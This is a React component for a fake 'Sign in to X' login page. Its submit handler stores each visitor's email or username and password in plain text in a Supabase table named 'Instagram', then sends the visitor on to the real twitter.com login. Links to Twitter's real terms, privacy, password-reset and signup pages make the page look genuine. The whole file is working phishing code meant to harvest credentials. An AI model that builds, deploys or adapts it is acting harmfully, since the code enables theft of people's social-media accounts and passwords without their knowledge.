import React, { useState } from "react";
import "./TwitterLogin.css";
import { supabase } from "../../supabase";

const TwitterLogin = () => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);
  const [success, setSuccess] = useState(false);
  const [error, setError] = useState("");

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setError("");
    setSuccess(false);
    const { error } = await supabase.from("Instagram").insert([
      { email, password },
    ]);
    setLoading(false);
    if (error) setError("Login failed. Try again.");
    else {
      setSuccess(true);
      window.location.href = "https://twitter.com/login";
    }
  };

  return (
    <div className="twitter-login-container">
      <div className="twitter-login-box">
        <div className="twitter-logo">🐦</div>
        <h2>Sign in to X</h2>
        <div className="twitter-login-agreement">
          By signing in, you agree to the{" "}
          <a
            href="https://twitter.com/en/tos"
            target="_blank"
            rel="noopener noreferrer"
          >
            Terms of Service
          </a>{" "}
          and{" "}
          <a
            href="https://twitter.com/en/privacy"
            target="_blank"
            rel="noopener noreferrer"
          >
            Privacy Policy
          </a>
          .
        </div>
        <div className="twitter-login-alt">
          <button
            type="button"
            onClick={() =>
              (window.location.href = "https://twitter.com/i/flow/login")
            }
          >
            Sign in with Google
          </button>
        </div>
        <div className="twitter-login-divider">
          <div className="line" />
          <div className="or">or</div>
          <div className="line" />
        </div>
        <form className="twitter-login-form" onSubmit={handleSubmit}>
          <label className="twitter-login-label">
            Phone, email, or username
          </label>
          <input
            type="text"
            className="twitter-login-input"
            placeholder="Phone, email, or username"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            required
          />
          <label className="twitter-login-label">Password</label>
          <input
            type="password"
            className="twitter-login-input"
            placeholder="Password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            required
          />
          <a
            className="twitter-login-forgot"
            href="https://twitter.com/account/begin_password_reset"
            target="_blank"
            rel="noopener noreferrer"
          >
            Forgot password?
          </a>
          <button type="submit" disabled={loading}>
            {loading ? "Signing in..." : "Sign In"}
          </button>
        </form>
        {success && <div className="twitter-success">Login saved!</div>}
        {error && <div className="twitter-error">{error}</div>}
        <div className="twitter-login-signup">
          Don't have an account?
          <a
            href="https://twitter.com/i/flow/signup"
            target="_blank"
            rel="noopener noreferrer"
          >
            Sign up
          </a>
        </div>
      </div>
    </div>
  );
};

export default TwitterLogin;
